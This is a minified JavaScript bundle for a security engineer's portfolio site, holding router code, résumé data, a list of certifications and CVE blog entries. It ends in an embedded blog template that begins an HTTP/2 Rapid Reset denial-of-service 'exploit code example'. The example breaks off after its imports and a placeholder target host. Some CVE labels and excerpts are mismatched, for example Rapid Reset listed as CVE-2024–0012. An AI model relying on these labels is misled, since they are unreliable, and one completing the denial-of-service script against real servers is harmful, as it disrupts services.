if((a=s)!=null&&a.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let l=e,i=(r=t)==null?void 0:r.errors;if(i!=null){let g=l.findIndex(f=>f.route.id&&(i==null?void 0:i[f.route.id])!==void 0);g>=0||Y(!1),l=l.slice(0,Math.min(l.length,g+1))}let o=!1,u=-1;if(t&&s&&s.v7_partialHydration)for(let g=0;g<l.length;g++){let f=l[g];if((f.route.HydrateFallback||f.route.hydrateFallbackElement)&&(u=g),f.route.id){let{loaderData:m,errors:v}=t,k=f.route.loader&&m[f.route.id]===void 0&&(!v||v[f.route.id]===void 0);if(f.route.lazy||k){o=!0,u>=0?l=l.slice(0,u+1):l=[l[0]];break}}}return l.reduceRight((g,f,m)=>{let v,k=!1,w=null,E=null;t&&(v=i&&f.route.id?i[f.route.id]:void 0,w=f.route.errorElement||sf,o&&(u<0&&m===0?(hf("route-fallback"),k=!0,E=null):u===m&&(k=!0,E=f.route.hydrateFallbackElement||null)));let d=n.concat(l.slice(0,m+1)),p=()=>{let h;return v?h=w:k?h=E:f.route.Component?h=x.createElement(f.route.Component,null):f.route.element?h=f.route.element:h=g,x.createElement(af,{match:f,routeContext:{outlet:g,matches:d,isDataRoute:t!=null},children:h})};return t&&(f.route.ErrorBoundary||f.route.errorElement||m===0)?x.createElement(rf,{location:t.location,revalidation:t.revalidation,component:w,error:v,children:p(),routeContext:{outlet:null,matches:d,isDataRoute:!0}}):p()},null)}var Wu=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Wu||{}),$u=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}($u||{});function of(e){let n=x.useContext(Jl);return n||Y(!1),n}function cf(e){let n=x.useContext(qh);return n||Y(!1),n}function uf(e){let n=x.useContext(bn);return n||Y(!1),n}function Gu(e){let n=uf(),t=n.matches[n.matches.length-1];return t.route.id||Y(!1),t.route.id}function pf(){var e;let n=x.useContext(Fu),t=cf(),s=Gu();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function df(){let{router:e}=of(Wu.UseNavigateStable),n=Gu($u.UseNavigateStable),t=x.useRef(!1);return Uu(()=>{t.current=!0}),x.useCallback(function(r,a){a===void 0&&(a={}),t.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,ss({fromRouteId:n},a)))},[e,n])}const go={};function hf(e,n,t){go[e]||(go[e]=!0)}function ff(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function _n(e){Y(!1)}function mf(e){let{basename:n="/",children:t=null,location:s,navigationType:r=an.Pop,navigator:a,static:l=!1,future:i}=e;cs()&&Y(!1);let o=n.replace(/^\/*/,"/"),u=x.useMemo(()=>({basename:o,navigator:a,static:l,future:ss({v7_relativeSplatPath:!1},i)}),[o,i,a,l]);typeof s=="string"&&(s=mt(s));let{pathname:g="/",search:f="",hash:m="",state:v=null,key:k="default"}=s,w=x.useMemo(()=>{let E=Xl(g,o);return E==null?null:{location:{pathname:E,search:f,hash:m,state:v,key:k},navigationType:r}},[o,g,f,m,v,k,r]);return w==null?null:x.createElement(Bn.Provider,{value:u},x.createElement(Lr.Provider,{children:t,value:w}))}function gf(e){let{children:n,location:t}=e;return ef(el(n),t)}new Promise(()=>{});function el(e,n){n===void 0&&(n=[]);let t=[];return x.Children.forEach(e,(s,r)=>{if(!x.isValidElement(s))return;let a=[...n,r];if(s.type===x.Fragment){t.push.apply(t,el(s.props.children,a));return}s.type!==_n&&Y(!1),!s.props.index||!s.props.children||Y(!1);let l={id:s.props.id||a.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(l.children=el(s.props.children,a)),t.push(l)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function nl(){return nl=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},nl.apply(this,arguments)}function vf(e,n){if(e==null)return{};var t={},s=Object.keys(e),r,a;for(a=0;a<s.length;a++)r=s[a],!(n.indexOf(r)>=0)&&(t[r]=e[r]);return t}function yf(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function kf(e,n){return e.button===0&&(!n||n==="_self")&&!yf(e)}const wf=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],bf="6";try{window.__reactRouterVersion=bf}catch{}const xf="startTransition",vo=pp[xf];function Sf(e){let{basename:n,children:t,future:s,window:r}=e,a=x.useRef();a.current==null&&(a.current=Sh({window:r,v5Compat:!0}));let l=a.current,[i,o]=x.useState({action:l.action,location:l.location}),{v7_startTransition:u}=s||{},g=x.useCallback(f=>{u&&vo?vo(()=>o(f)):o(f)},[o,u]);return x.useLayoutEffect(()=>l.listen(g),[l,g]),x.useEffect(()=>ff(s),[s]),x.createElement(mf,{basename:n,children:t,location:i.location,navigationType:i.action,navigator:l,future:s})}const Ef=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Tf=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Ue=x.forwardRef(function(n,t){let{onClick:s,relative:r,reloadDocument:a,replace:l,state:i,target:o,to:u,preventScrollReset:g,viewTransition:f}=n,m=vf(n,wf),{basename:v}=x.useContext(Bn),k,w=!1;if(typeof u=="string"&&Tf.test(u)&&(k=u,Ef))try{let h=new URL(window.location.href),y=u.startsWith("//")?new URL(h.protocol+u):new URL(u),S=Xl(y.pathname,v);y.origin===h.origin&&S!=null?u=S+y.search+y.hash:w=!0}catch{}let E=Zh(u,{relative:r}),d=_f(u,{replace:l,state:i,target:o,preventScrollReset:g,relative:r,viewTransition:f});function p(h){s&&s(h),h.defaultPrevented||d(h)}return x.createElement("a",nl({},m,{href:k||E,onClick:w||a?s:p,ref:t,target:o}))});var yo;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(yo||(yo={}));var ko;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(ko||(ko={}));function _f(e,n){let{target:t,replace:s,state:r,preventScrollReset:a,relative:l,viewTransition:i}=n===void 0?{}:n,o=Hu(),u=us(),g=Vu(e,{relative:l});return x.useCallback(f=>{if(kf(f,t)){f.preventDefault();let m=s!==void 0?s:dr(u)===dr(g);o(e,{replace:m,state:r,preventScrollReset:a,relative:l,viewTransition:i})}},[u,o,g,s,r,t,e,a,l,i])}function Cf({onToggleTheme:e,theme:n}){const t=us(),s=Hu(),r=t.pathname==="/blogs",a=t.pathname.startsWith("/projects"),l=t.pathname.startsWith("/certifications"),i=t.hash==="#contact"||t.pathname==="/contact",o=(u,g)=>{u.preventDefault();const f=()=>{const m=document.getElementById(g);m&&m.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(s("/"),setTimeout(f,80)):f()};return c.jsx("nav",{className:"navbar",children:c.jsxs("div",{className:"container nav-container",children:[c.jsxs("div",{className:"logo",children:[c.jsx("i",{className:"fas fa-mug-hot mug-icon","aria-hidden":"true"})," Portfolio | Hem Parekh"]}),c.jsxs("ul",{className:"nav-links",children:[c.jsx("li",{children:c.jsx("a",{href:"#about",onClick:u=>o(u,"about"),children:"About"})}),c.jsx("li",{children:c.jsx("a",{href:"#experience",onClick:u=>o(u,"experience"),children:"Experience"})}),c.jsx("li",{children:c.jsx(Ue,{to:"/projects",className:a?"active":"",children:"Projects"})}),c.jsx("li",{children:c.jsx(Ue,{to:"/certifications",className:l?"active":"",children:"Certs"})}),c.jsx("li",{children:c.jsx(Ue,{to:"/blogs",className:r?"active":"",children:"Blog"})}),c.jsx("li",{children:c.jsx("a",{href:"#contact",className:i?"active":"",onClick:u=>o(u,"contact"),children:"Contact"})})]}),c.jsxs("button",{className:"theme-toggle",id:"themeToggle",onClick:e,children:["Conference Room Lights: ",n==="dark"?"On":"Off"]})]})})}function Pf(){return c.jsx("footer",{className:"footer",children:c.jsx("div",{className:"container",children:c.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Nr(e=.15){const n=x.useRef(null),[t,s]=x.useState(!1);return x.useEffect(()=>{const r=n.current;if(!r)return;const a=new IntersectionObserver(([l])=>{l.isIntersecting&&(s(!0),a.unobserve(l.target))},{threshold:e});return a.observe(r),()=>a.disconnect()},[e]),[n,t]}function Lf({data:e}){const[n,t]=Nr();return c.jsx("header",{className:`hero reveal ${t?"visible":""}`,id:"home",ref:n,children:c.jsxs("div",{className:"hero-content container",children:[c.jsxs("div",{className:"hero-copy",children:[c.jsx("div",{className:"hero-badge",children:"Assistant to the Regional Security Engineer"}),c.jsxs("h1",{children:["Hello, I'm ",c.jsx("span",{className:"highlight",children:e.highlight}),"."]}),c.jsxs("div",{className:"hero-descriptors",children:[c.jsx("span",{className:"pill",children:"Security Engineer"}),c.jsx("span",{className:"pill",children:"Pen Tester"})]}),c.jsx("p",{className:"hero-funfact",children:"Fun fact: Bears. Beets. Battlestar Encryption."}),c.jsx("p",{children:e.blurb}),c.jsxs("div",{className:"hero-ctas",children:[c.jsx(Ue,{className:"button primary clipboard",to:"/projects",children:"View Projects"}),c.jsx(Ue,{className:"button ghost clipboard",to:"/certifications",children:"View Certificates"})]}),c.jsx("div",{className:"scroll-down-arrow",children:c.jsx("a",{href:"#about",className:"arrow-link",children:c.jsx("span",{children:"↓"})})})]}),c.jsx("div",{className:"hero-photo-card",children:c.jsx("div",{className:"polaroid",children:c.jsx("img",{src:e.image,className:"heading-image",alt:"Heading"})})})]})})}function Nf({links:e=[]}){return c.jsx("div",{className:"social-icons",children:e.map(n=>c.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer","aria-label":n.label||"Social link",children:c.jsx("i",{className:n.icon})},n.href))})}function Of({data:e,socials:n}){const[t,s]=Nr();return c.jsx("section",{className:`about reveal ${s?"visible":""}`,id:"about",ref:t,children:c.jsxs("div",{className:"container about-container",children:[c.jsx("div",{className:"about-photo",children:c.jsx("img",{src:e.image,alt:"Hem Parekh",style:{maxWidth:"100%",borderRadius:"10px"}})}),c.jsxs("div",{className:"about-content",children:[c.jsx("h2",{children:e.title}),c.jsx("p",{children:e.text}),c.jsx(Nf,{links:n})]})]})})}const Rf={"Privacy Engineer":{domains:["Privacy","Cloud"],impact:"High",capabilities:{"Privacy Reviews":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Pen Testing":!1},tools:["AWS","Splunk","Python","Terraform"],outcome:"Cut data exposure paths; embedded privacy-by-design across services. Declared 'World’s Best Pen Tester' (self-awarded mug).",actions:[]},"Cybersecurity Engineer Intern":{domains:["AppSec","Infra"],impact:"High",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Privacy Reviews":!1},outcome:"8 critical issues fixed; 25+ web apps hardened.",actions:[]},"Research Assistant":{domains:["Research","Compliance"],impact:"Medium",capabilities:{Compliance:!0,"Threat Modeling":!0,"Privacy Reviews":!0,Automation:!1,"Pen Testing":!1,"Incident Response":!1},tools:["NIST 800-53","ISO 27001","Python"],outcome:"Risk assessments aligned to NIST/ISO; controls implemented with teams.",actions:[]},"Cybersecurity Analyst Intern":{domains:["AppSec","Infra"],impact:"Medium",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Compliance:!0,Automation:!1,"Incident Response":!1,"Privacy Reviews":!1},tools:["Nessus","Burp","Splunk"],outcome:"Assessed 18 internal systems; delivered remediation guidance.",actions:[]},"Security Operational Analyst (SOC)":{domains:["Detection","Operations"],impact:"Medium",capabilities:{"Incident Response":!0,"Threat Modeling":!1,"Pen Testing":!1,Compliance:!1,Automation:!0,"Privacy Reviews":!1},outcome:"Monitored 100+ devices; improved alert handling and root-cause analysis.",actions:[]}};function Af({item:e,idx:n}){const[t,s]=Nr(),r=Rf[e.role]||{},a=r.domains||[],l=r.capabilities||{},i=r.actions||[e.desc];return c.jsxs("article",{className:`exp-card reveal ${s?"visible":""} card-hover`,ref:t,style:{transitionDelay:`${n*80}ms`},children:[c.jsxs("header",{className:"exp-card-header",children:[c.jsxs("div",{children:[c.jsx("h3",{children:e.role}),c.jsx("h4",{children:e.org})]}),c.jsx("div",{className:"exp-dates",children:e.range})]}),c.jsxs("div",{className:"exp-chips",children:[a.map(o=>c.jsx("span",{className:"pill",children:o},o)),r.impact&&c.jsxs("span",{className:"pill impact",children:["Impact: ",r.impact]})]}),c.jsx("div",{className:"exp-outcome",children:r.outcome||e.desc}),c.jsx("div",{className:"exp-capabilities",children:Object.entries(l).map(([o,u])=>c.jsxs("div",{className:`exp-cap ${u?"on":"off"}`,children:[c.jsx("span",{className:"dot-cap"}),o]},o))}),c.jsx("ul",{className:"exp-actions",children:i.map(o=>c.jsx("li",{children:o},o))})]},`${e.range}-${e.role}`)}function jf({items:e}){const[n,t]=Nr(.1);return c.jsx("section",{className:`experience reveal ${t?"visible":""}`,id:"experience",ref:n,children:c.jsxs("div",{className:"container",children:[c.jsx("div",{className:"section-header",children:c.jsxs("div",{children:[c.jsx("h2",{children:"EXPERIENCE"}),c.jsx("p",{className:"section-subtitle",children:"Jim would absolutely look into the camera right now."})]})}),c.jsx("div",{className:"experience-grid",children:e.map((s,r)=>c.jsx(Af,{item:s,idx:r},`${s.range}-${s.role}`))})]})})}const Mf=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],If={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"I’m a Security Engineer & Pen Tester, enthusiastic about building robust software and hunting vulnerabilities."},Df={title:"ABOUT ME",image:"/images/profile.jpeg",text:`I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building robust software 
        and unearthing vulnerabilities. I blend engineering expertise with a hacker’s curiosity to design 
        secure solutions. Outside of code and exploits, I enjoy blogging about my discoveries and advocating 
        for a safer digital world.`},zf=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],Bf=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],Ff=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],Uf={title:"Hi there 👋, welcome to my Blog",subtitle:"This is where I talk about my projects and everything that I find interesting in Cybersecurity.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},tl=[{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"February 28, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function wo(){return c.jsxs(c.Fragment,{children:[c.jsx(Lf,{data:If}),c.jsx(jf,{items:zf}),c.jsx(Of,{data:Df,socials:Mf})]})}function Hf({data:e}){return c.jsx("header",{className:"blog-welcome-section",children:c.jsxs("div",{className:"container text-center",children:[c.jsxs("h1",{children:["Hi there ",c.jsx("span",{className:"wave",children:"👋"}),", welcome to my Blog"]}),c.jsx("p",{className:"blog-subtitle",children:e.subtitle})]})})}function Vf({posts:e,page:n=1,totalPages:t=1,onPageChange:s}){return c.jsx("section",{className:"blog-list-section",children:c.jsxs("div",{className:"container",children:[e.map(r=>c.jsxs("article",{className:"blog-row",children:[c.jsxs("div",{className:"blog-row-meta",children:[c.jsx("div",{className:"blog-row-date",children:r.date}),c.jsx("div",{className:"blog-row-time",children:r.readTime})]}),c.jsxs("div",{className:"blog-row-body",children:[c.jsx(Ue,{to:r.href,className:"blog-row-title",children:r.title}),c.jsx("p",{className:"blog-row-excerpt",children:r.excerpt}),c.jsx("div",{className:"blog-tags",children:c.jsx("span",{className:"pill",children:"Security"})})]}),c.jsx("div",{className:"blog-row-cta",children:c.jsx(Ue,{to:r.href,className:"view-credentials",children:"Read"})})]},r.title)),t>1&&c.jsxs("div",{className:"blog-pagination",children:[c.jsx("button",{className:"pill",disabled:n===1,onClick:()=>s==null?void 0:s(Math.max(1,n-1)),children:"Previous"}),c.jsxs("span",{className:"blog-page-indicator",children:["Page ",n," of ",t]}),c.jsx("button",{className:"pill",disabled:n===t,onClick:()=>s==null?void 0:s(Math.min(t,n+1)),children:"Next"})]})]})})}function Wf({posts:e,onFilter:n}){const[t,s]=x.useState(""),r=x.useMemo(()=>t.trim()?e.filter(l=>l.title.toLowerCase().includes(t.toLowerCase())||l.excerpt.toLowerCase().includes(t.toLowerCase())):e,[t,e]),a=l=>{s(l.target.value),n(r)};return c.jsxs("div",{className:"blog-search",children:[c.jsx("label",{className:"search-label",htmlFor:"blog-search",children:"Search posts"}),c.jsxs("div",{className:"search-shell",children:[c.jsx("i",{className:"fas fa-search search-icon","aria-hidden":"true"}),c.jsx("input",{id:"blog-search",type:"search",value:t,onChange:a,placeholder:"Type a keyword…",className:"search-input"})]})]})}function $f(){const[e,n]=x.useState(tl),[t,s]=x.useState(1),r=5,a=Math.max(1,Math.ceil(e.length/r)),l=e.slice((t-1)*r,t*r),i=o=>{n(o),s(1)};return c.jsxs(c.Fragment,{children:[c.jsx(Hf,{data:Uf}),c.jsx("div",{className:"container blog-controls",children:c.jsx(Wf,{posts:tl,onFilter:i})}),c.jsx(Vf,{posts:l,page:t,totalPages:a,onPageChange:s})]})}const Gf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
